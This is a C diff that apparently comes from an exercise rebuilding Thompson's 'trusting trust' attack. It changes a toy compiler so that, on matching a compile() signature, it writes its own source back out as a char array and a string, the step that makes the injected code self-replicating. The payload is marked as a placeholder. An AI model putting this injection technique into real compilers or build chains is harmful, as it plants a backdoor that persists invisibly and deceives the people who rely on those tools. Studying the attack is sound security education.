@@ -8,7 +8,9 @@
     static char compile_sig[] =
             "static void compile(char *program, char *outname) {\n"
             "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
-            "    assert(fp);"
+            "    assert(fp);\n"
+            "    fprintf(fp, \"%s\", program);\n"
+            "    fclose(fp);"
             ;
 
     // and inject a placeholder "attack":
@@ -29,9 +31,16 @@
         }
 
         char_ptr += strlen(compile_sig);
-        fprintf(fp, "\n%s", compile_sig);
-        fprintf(fp, "\n\t%s", compile_attack);
+        fprintf(fp, "\n%s\n\n\t", compile_sig);
 
+        // Now inject as an array THEN string
+        fprintf(fp, "char prog[] = {\n");
+        for(int i = 0; prog[i]; i++)
+            fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
+        fprintf(fp, "0 };\n");
+        fprintf(fp, "%s", prog);
+
+        // Finally finish off the rest of the compiler.c
         while (char_ptr != program + strlen(program)) {
             fprintf(fp, "%c", *char_ptr);
             char_ptr++;
